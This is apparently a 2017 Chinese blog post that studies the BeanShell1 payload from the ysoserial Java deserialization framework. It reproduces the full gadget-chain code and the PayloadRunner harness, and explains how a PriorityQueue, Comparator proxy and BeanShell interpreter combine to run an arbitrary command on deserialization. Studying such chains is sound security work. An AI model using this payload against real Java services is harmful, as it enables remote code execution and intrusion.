---
title: Java反序列化框架ysoserial学习
date: 2017-9-17 11:19:00
tags: 
- 安全学习
- Java
author: Lin
---
## 简介
[ysoserial](https://github.com/frohoff/ysoserial)是github上一个Java反序列化工具框架，它包含常见的Java反序列化类型，包含Jenkins，WebLogic及JBoss等反序列化漏洞的利用Payload，及其生成过程。今天分析的BeanShell1只是其中的一个例子，当中用到很多Java中比较高深的技术，学习反序列化的同时，一并学习下Java。
<!--more-->
## BeanShell1
这个Payload是利用BeanShell实现的，实现过程也比较巧妙。BeanShel是Java的动态脚本解释器，可以让Java项脚本语言一样运行。开始我们的代码分析了，ysoserial可以从Github上clone，我是在Eclipse中编译的。
```
	public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
 
    public PriorityQueue getObject(String command) throws Exception {
	// BeanShell payload
	String payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"" + command + "\"}).start();return new Integer(1);}";

	// Create Interpreter
	Interpreter i = new Interpreter();

	// Evaluate payload
	i.eval(payload);

	// Create InvocationHandler	
	XThis xt = new XThis(i.getNameSpace(), i);
	InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

	// Create Comparator Proxy
	Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

	// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
	final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
	Object[] queue = new Object[] {1,1};
	Reflections.setFieldValue(priorityQueue, "queue", queue);
	Reflections.setFieldValue(priorityQueue, "size", 2);

	return priorityQueue;
    }
 
    public static void main(final String[] args) throws Exception {
	PayloadRunner.run(BeanShell1.class, args);
    }
}
```
从代码可以看出，BeanShell1继承自PayloadRunner，实现了ObjectPayload接口。它定义了一个函数getObject,这个是接口ObjectPayload要求的，也是整个框架中的重要组成，后面会详细分析。同样还有一个静态的主函数main，作为程序运行的入口。  
PayloadRunner并不是直接接受输入的命令，BeanShell1作为其子类，才是反序列化真正的入口。从代码的追开始看起。
## BeanShell1的main函数
真正的入口在BeanShell1中的main函数中，调用方式为
```
	PayloadRunner.run(BeanShell1.class, args)
```	
args就是传入的命令了。BeanShell1是关键。BeanShell1.class的调用是用来获取BeanShell1这个类的运行时类。如果是一个对象实例的话，可以通过object.getClass()来获取。这个方法时定义在Object类中。运行时类Runtime Class是Java中很多黑魔法的开始，也使得Java功能强大的原因之一。这里，我们只需要记住，PayloadRunner.run接受的第1个参数是BeanShell1的运行时类就OK了。
## PayloadRunner.run函数
开始跟踪PayloadRunner.run函数的调用轨迹。
```
public class PayloadRunner {
	public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
		// ensure payload generation doesn't throw an exception
		byte[] serialized = new ExecCheckingSecurityManager().wrap(new Callable<byte[]>(){
			public byte[] call() throws Exception {
				final String command = args.length > 0 && args[0] != null ? args[0] : "calc.exe";

				System.out.println("generating payload object(s) for command: '" + command + "'");

				ObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(command);

				System.out.println("serializing payload");
				byte[] ser = Serializer.serialize(objBefore);
				Utils.releasePayload(payload, objBefore);
                return ser;
		}});

		try {
			System.out.println("deserializing payload");
			final Object objAfter = Deserializer.deserialize(serialized);
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

}
```
从代码中看出这个函数很小，功能很简单，生成了Payload的序列化字节码serialized ，交由Deserializer进行反序列化，触发Payload执行。下面来看具体的生成流程。
### 字节码的生成
* 通过包装函数ExecCheckingSecurityManager了一段代码，为什么要加一个层安全管理，这个现在还不知道。一定有它的原因，随后再学习了。
* 判断传入的args,生成命令字符串。
```
ObjectPayload<?> payload = clazz.newInstance();
final Object objBefore = payload.getObject(command);
```
* 首先通过运行时类，直接获取一个对象实例，然后，调用getObject函数，生成待序列化的对象。  
* getObject函数
getObject函数定义在BeanShell1中，因为BeanShell1实现了ObjectPayload接口，所以一定要定义getObject函数，这也是yso反序列化框架里最最重的一个函数。  
1. 首先生成了payload字符串，也就是要执行的命令，这里可以看到是一个Java的函数的文本形式。
2. 下面生成了一个BeanShell的解释器Interpreter实例，BeanShell是Java的一个工具包，用来以脚本形式来执行Java代码的方式。当然可以把它嵌入到正常的Java代码中去，这就是bsh.Interpreter.
3. 调用实例的eval函数来解析payload，当然解析成功也不会执行，因为是一个函数，而且记着我们现在是getObject中，正在生成payload序列过程中，此时当然不能执行命令了。我们需要的是在反序列化时执行命令。  
可以这样理解，当BeanShell解析过payload后，只是在解析器实例的命名空间中生成了一个函数。我们也知道了，执行命令的关键在于如何触发这个函数的执行。
4. 下面一行，生成了一个XThis实例，代码里的注释告诉我们，这是为了创建一个触发器InovcationHandler，通过查看源码我们知道XThis实例就代表了那段解析过的payload，也就是说生成那个compare函数，就是XThis实例的函数了。
```
InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
```
这行代码就是链式调用，首先是调用getFileld函数，得到invocationHandler的成员(Field类实例)，通过查看源码，可以知道，XThis对象是有一个公有成员，invocationHandler的，我们知道，一个类的实例的成员，是不能直接访问的，要通过obj.member，这样的形式访问的，这里应该是Java的一个黑魔法之一，可以直接访问一个对象的对象实例。至于这是怎么实现的，后面再研究了。  
返回了这个对象的Field实例后，又调用了Field的get函数，想必这就是返回真正的InvocationHandler 对象了，果不其然，在XThis中，invocationHandler成员的类型正是InvocationHandler接口。
也就是说InvocationHandler在被调用时，会自动调用它的函数invoke。
```
Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
```
这段代码生成了一比较器代理，用于随后的优先队列。
5. 最后的反序列对象
```
final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
			Object[] queue = new Object[] {1,1};
			Reflections.setFieldValue(priorityQueue, "queue", queue);
			Reflections.setFieldValue(priorityQueue, "size", 2);
```
剩下的就比较好理解了，生成了一个优先队列，设定它的比较器为刚刚生成的比较器，给它添加了两个对象成员。为什么要添加两个对象呢，因为我们要触发comparator函数，优先队列有两个元素时，会自动触发一次比较。
然后返回这个对象。
### 生成序列码
根据返回的优先队列的对象，进行序列化，生成了序列化字节码，用于后面的反序列化。
### 进行反序列化操作
PayloadRunner.run函数最后对生成的序列化字节码进行反序列化操作。触发命令执行。

## 命令执行的触发流程
最后也时最精彩的部分了，反序列化时，生成了一个优先队列对象，然后恢复这个对象里的数据，因为在生成序列化对象时，我们给它里面塞了两个对象。当它恢复时，它自动执行了comapator代理的invocationHandler，也就执行了BeanShell1中动态添加的方法，从前面流程可以看到，我们定义在这个函数里的命令，也就会得到执行了。  
这也是这个漏洞利用的最巧妙的地方。
## 总结
整个命令执行的过程比较简单，但其中用到几个Java高级技术，还需要进一步学习。
1. Reflections机制，如何把一个对象的成员单独拎出来，可以将由其他对象访问。
2. InvocationHandler接口，一般来说接口是不能实例化的，但在代码中看到了把一个对象转化为接口实例。
3. Java的代理机制。
